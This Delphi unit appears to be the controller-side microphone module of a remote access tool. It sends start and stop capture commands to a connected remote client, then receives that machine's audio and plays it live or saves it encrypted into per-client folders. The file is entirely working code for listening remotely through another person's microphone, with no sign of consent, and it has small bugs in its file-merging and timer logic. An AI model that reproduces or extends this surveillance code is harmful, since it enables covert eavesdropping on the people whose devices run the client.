unit UnitMicrophone;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, acPNG, ExtCtrls, acImage, jpeg, StdCtrls, UnitMain,
  Menus, SocketUnitEx, ACMConvertor, ACMOut, MMSystem, UnitVariables, UnitCommands,
  UnitFunctions, UnitRepository, UnitEncryption, ImgList, UnitConstants, UnitManager;

type
  TFormMicrophone = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn3: TToolButton;
    pnlMicrophone: TPanel;
    rg2: TRadioGroup;
    rg1: TRadioGroup;
    lv1: TListView;
    btn2: TToolButton;
    pb1: TProgressBar;
    pm1: TPopupMenu;
    S1: TMenuItem;
    N1: TMenuItem;
    D2: TMenuItem;
    P1: TMenuItem;
    dlgSave1: TSaveDialog;
    il1: TImageList;
    grp1: TGroupBox;
    lbl1: TLabel;
    lbl2: TLabel;
    lbl3: TLabel;
    tmr1: TTimer;
    procedure btn1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure P1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure D2Click(Sender: TObject);
    procedure lv1Deletion(Sender: TObject; Item: TListItem);
    procedure btn3Click(Sender: TObject);
    procedure tmr1Timer(Sender: TObject);
  private
    { Private declarations }
    Client: TClientDatas;   
    ACMC: TACMConvertor;                                                                        
    function ListWaves(Path: string): TStringArray;
    procedure MergeWaves(FileList: TStringArray; FileCount: Integer; OutFile: string);  
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }       
    ACMO: TACMOut;
    constructor Create(aOwner: TComponent; _Client: TClientDatas);  
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormMicrophone: TFormMicrophone;

implementation

{$R *.dfm}

constructor TFormMicrophone.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;
               
procedure TFormMicrophone.AddLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormMicrophone.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormMicrophone.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormMicrophone.WndProc(var Msg: TMessage);
var
  Stream: TMemoryStream;
  TmpStr, Datas: string;
  TmpItem: TListItem;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);  
    Stream := TMemoryStream.Create;
    Stream.Write(Pointer(Datas)^, Length(Datas));

    if btn3.Down then ACMO.Play(Stream.Memory^, Stream.Size);

    TmpItem := lv1.Items.Add;
    TmpItem.Caption := IntToStr(lv1.Items.Count);
    TmpItem.SubItems.Add(FileSizeToStr(Stream.Size));
    TmpItem.SubItems.Add(TimeToStr(Time));
    TmpItem.Data := Stream;
    TmpItem.ImageIndex := 0;

    AddRecvLog('Audio stream with size ' + TmpItem.SubItems[0]);
  end;
end;

procedure TFormMicrophone.btn1Click(Sender: TObject);
var
  Format: tWAVEFORMATEX;
  Channel, Sample: Integer;
begin
  if btn1.Down = True then
  begin
    case rg2.ItemIndex of
      0:  Channel := 2;
      1:  Channel := 1;
    end;

    case rg1.ItemIndex of
      0:  Sample := 48000;
      1:  Sample := 44100;
      2:  Sample := 22100;
      3:  Sample := 11050;
      4:  Sample := 8000;
    end;

    Format.nChannels := Channel;
    Format.nSamplesPerSec := Sample;
    Format.wBitsPerSample := 16;
    Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
    Format.nBlockAlign := Format.nChannels * 2;
    ACMC.FormatIn.Format.nChannels := Format.nChannels;
    ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
    ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
    ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
    ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
    Client.SendDatas(MICROPHONECAPTURESTART + '|' + IntToStr(Channel) + '|' + IntToStr(Sample));
    AddSentLog('Start microphone capture on channel ' + IntToStr(Channel) + ' with sample ' + IntToStr(Sample));

    if lv1.Items.Count = 0 then
    begin
      lbl1.Caption := '00';
      lbl2.Caption := '00';
    end;

    tmr1.Enabled := True;
  end
  else
  begin
    Client.SendDatas(MICROPHONECAPTURESTOP + '|');
    AddSentLog('Stop microphone capture');
    tmr1.Enabled := False;
  end;
end;

procedure TFormMicrophone.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  if btn1.Down = True then
  begin
    btn1.Down := False;
    btn1.Click;
  end;
end;

procedure TFormMicrophone.FormCreate(Sender: TObject);
begin
  ACMO := TACMOut.Create(nil);
  ACMC := TACMConvertor.Create;
  ACMO.NumBuffers := 0;
  ACMO.Open(ACMC.FormatIn);
end;

procedure TFormMicrophone.FormShow(Sender: TObject);
begin
  if AutostartMic then
  begin
    btn1.Down := True;
    btn1.Click;
  end;
end;

procedure TFormMicrophone.P1Click(Sender: TObject);
var
  Stream: TMemoryStream;
  i: Integer;
begin
  if lv1.Items.Count = 0 then Exit;
  for i := 0 to lv1.Items.Count - 1 do
  begin
    Application.ProcessMessages;
    if not lv1.Items.Item[i].Selected then Continue;
    Stream := TMemoryStream(lv1.Items.Item[i].Data);
    ACMO.Play(Stream.Memory^, Stream.Size);
  end;

  AddLog('Audio stream played');
end;

procedure TFormMicrophone.S1Click(Sender: TObject);
var
  Stream: TMemoryStream;
  TmpList: TStringArray;
  TmpStr: string;
  i: Integer;
begin
  if lv1.Items.Count = 0 then Exit;

  dlgSave1.InitialDir := GetMicrophoneFolder(Client.UserId);
  dlgSave1.FileName := MyGetTime('_') + '.audio';
  dlgSave1.Filter := 'Audio record (*.audio)|*.audio';
  dlgSave1.DefaultExt := 'audio';
  if (not dlgSave1.Execute) or (dlgSave1.FileName = '') then Exit;

  TmpStr := ExtractFilePath(dlgSave1.FileName) + '_Temp';
  CreateDirectoryA(PChar(TmpStr), nil);

  for i := 0 to lv1.Items.Count - 1 do
  begin
    if not lv1.Items.Item[i].Selected then Continue;
    Stream := TMemoryStream(lv1.Items.Item[i].Data);
    Stream.SaveToFile(TmpStr + '\wav' + IntToStr(i));
  end;

  TmpList := ListWaves(TmpStr);
  MergeWaves(TmpList, lv1.Items.Count, dlgSave1.FileName);
  DeleteAllFilesAndDir(TmpStr);
  AddLog('Audio stream saved');
end;

procedure TFormMicrophone.D2Click(Sender: TObject);
var
  i: Integer;
begin
  for i := lv1.Items.Count - 1 downto 0 do
  if lv1.Items.Item[i].Selected = True then lv1.Items.Item[i].Delete;
end;

procedure TFormMicrophone.lv1Deletion(Sender: TObject; Item: TListItem);
begin
  TMemoryStream(Item.Data).Free;
end;

//This function merge many stream in one, by wrh1d3
procedure TFormMicrophone.MergeWaves(FileList: TStringArray; FileCount: Integer;
  OutFile: string);
var
  TmpStream, Stream: TMemoryStream;
  TmpStr: string;
  i: Integer;
begin
  TmpStream := TMemoryStream.Create;
  TmpStream.LoadFromFile(FileList[0]);
  TmpStream.Position := 0;
  Stream := TMemoryStream.Create;
  Stream.CopyFrom(TmpStream, TmpStream.Size);

  for i := 0 to FileCount - 1 do
  begin
    TmpStream := TMemoryStream.Create;
    TmpStream.LoadFromFile(FileList[i]);
    TmpStream.Position := 0;
    Stream.Position := Stream.Size;
    Stream.CopyFrom(TmpStream, TmpStream.Size);
  end;

  Stream.Position := 0;
  SetLength(TmpStr, Stream.Size);
  Stream.Read(Pointer(TmpStr)^, Length(TmpStr));
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  MyCreateFile(OutFile, TmpStr, Length(TmpStr));
  Stream.Free;
end;

function TFormMicrophone.ListWaves(Path: string): TStringArray;
var
  SchRec: TSearchRec;
  i: Integer;
begin
  Path := Path + '\';
  if FindFirst(Path + '*.*', faAnyFile, SchRec) <> 0 then Exit;
  
  i := 0;
  repeat
    if (SchRec.Attr and faDirectory) = faDirectory then Continue;
    Result[i] := Path + SchRec.Name;
    Inc(i);
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);
end;

procedure TFormMicrophone.btn3Click(Sender: TObject);
begin
  if btn3.Down then AddLog('Started playing received stream') else
    AddLog('Stopped playing received stream');
end;

procedure TFormMicrophone.tmr1Timer(Sender: TObject);
var
  i, j: Integer;
begin
  j := StrToInt(lbl2.Caption);
  j := j + 1;
  lbl2.Caption := IntToStr(j);

  if j > 60 then
  begin
    lbl2.Caption := '00';
    
    i := StrToInt(lbl1.Caption);
    i := i + 1;
    lbl1.Caption := IntToStr(i);
  end;
end;

end.
